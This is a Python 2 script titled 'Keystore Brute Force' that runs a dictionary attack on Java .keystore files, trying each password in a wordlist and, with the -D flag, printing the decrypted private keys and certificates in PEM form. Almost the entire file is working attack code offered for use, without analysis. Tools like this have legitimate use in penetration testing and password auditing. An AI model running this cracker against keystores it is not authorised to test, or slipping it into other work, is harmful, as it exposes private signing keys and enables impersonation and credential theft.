#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author: Felipe Molina de la Torre (@felmoltor)
# Date: 04/2015
# License: GPLv3
# Summary:  This script execute a dictionary attack against the typical java ".keystore" files
#           Just provide the path to the keystore and the dictionary and will try to unlock
#           the keystore with all the password of the dictionary
# Changelog:
#    * 2019/02/26:    Added -D flag to optionally dump the key store information.
#                    Fix bug that reported always no keys where found
#                    Print in the screen the invalid passwords 

import sys, base64, textwrap
import jks
from optparse import OptionParser
from termcolor import colored,cprint
import time

VERSION="1.1"

def printPercent(prefix="Progress: ", iteration=0.0, total=100.0, decimals=1, length=100, suffix="Complete", fill='█'):
    percent = ("{0:." + str(decimals) + "f}").format(100 * (iteration / float(total)))
    filledLength = int(length * iteration // total)
    bar = fill * filledLength + '-' * (length - filledLength)
    sys.stdout.write('\r%s |%s| %s%% %s' % (prefix, bar, percent, suffix))
    sys.stdout.flush()

def printBanner():
    print colored("======================================","blue","on_white")
    print colored("=      Keystore Brute Force v%s     =" % VERSION,"blue","on_white")
    print colored("= Author: Felipe Molina (@felmoltor) =","blue","on_white")
    print colored("======================================","blue","on_white")
    print

def getoptions():
    usage = "usage: %prog [options] arg1 arg2"#
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Show password being tested [default: False]")
    parser.add_option("-k", "--keystore",metavar="FILE",dest="keystore", help="Keystore to crack")
    parser.add_option("-D", "--dump-store", action="store_true", dest="dumpstore", default=False, help="If specified, the keystore information will be dumped in the terminal")
    parser.add_option("-K", "--keystore-list",metavar="FILE", dest="keystorefile", default=None, help="A file with a list of keystores to crack")
    parser.add_option("-d", "--dictionary", default="dictionary.txt",dest="dictionary",help="Dictionary to use in the brute force")
    (options,args) = parser.parse_args()
    return options

def print_pem(data, type):
    print "-----BEGIN %s-----" % type
    print "\r\n".join(textwrap.wrap(base64.b64encode(data), 64))
    print "-----END %s-----" % type

def dictionaryAttack(keystore,dictionary):
    foundpwd=False
    NotValidFile=False
    df = open(dictionary,"r")
    msg="= Brute forcing keystore file '%s' =" % keystore
    print colored("="*len(msg),"cyan")
    print colored(msg,"cyan")
    print colored("="*len(msg),"cyan")
    dictines = df.readlines()
    npassw=len(dictines)
    cpassw=0    
    for passw in dictines:
        cpassw+=1
        passw=passw.strip()
        printPercent(iteration=cpassw, total=npassw, suffix="Testing %s" % passw)
        try:
            ks = jks.KeyStore.load(keystore, passw, try_decrypt_keys=True)
            sys.stdout.write("\n [+] Valid password found: ")
            print colored("%s" % passw,"green")
            print ""
            foundpwd=True
            if options.dumpstore:
                dumpKeyStore(ks)
            
        except jks.util.KeystoreSignatureException as e:
            continue
                
        except jks.util.BadKeystoreFormatException as e:
            print "\nError opening (%s): The file is not a Java Key Store. Skipping" % keystore
            NotValidFile=True
            break
        
        except UnicodeDecodeError as ue:
            if options.verbose:
                print "\nError. Tried password is not ASCII encoded. Skipping this password"
        
        if foundpwd:
            break
    if foundpwd == False and NotValidFile == False:
        print colored("\n\nA valid password couln't be found :-(","red") 

def dumpKeyStore(ks):
    
    print "********* BEGIN PRIVATE KEY *********"
    for kalias in ks.private_keys.keys():
        sys.stdout.write(colored(" [i]", "grey"))
        print " Private Key Entry Alias: %s\n" % kalias
        pk = ks.private_keys[kalias]
        if not pk.is_decrypted():
            pk.decrypt()
        try:
            print_pem(pk.pkey, "RSA PRIVATE KEY")
        except Exception as e:
            print "There was a problem accessing to the private key"
    print "********* END PRIVATE KEY *********\n"
    
    print "********* BEGIN PRIVATE KEYS CERTIFICATES *********"
    for c in pk.cert_chain:
        print_pem(c[1], "CERTIFICATE")
        print
    print "********* END PRIVATE KEYS CERTIFICATES *********\n"

    print "********* BEGIN KEY STORE CERTIFICATES *********"
    for cername in ks.certs:
        c = ks.certs[cername]
        sys.stdout.write(colored(" [i]", "grey"))
        print " Certificate name: %s\n" % cername
        print_pem(c.cert, "CERTIFICATE")
        print  
    print "********* END KEY STORE CERTIFICATES *********\n"

# ======== #
# = MAIN = #
# ======== #

printBanner()
options = getoptions()

if options.keystorefile is not None:
    kslistf = open(options.keystorefile,"r")
    for ksfile in kslistf.readlines():
        ksfile=ksfile.strip()
        dictionaryAttack(ksfile,options.dictionary)
elif options.keystore is not None:
    dictionaryAttack(options.keystore,options.dictionary)
else:
    print "Error. Provide a keystore file name or a keystore list"
    exit(1)


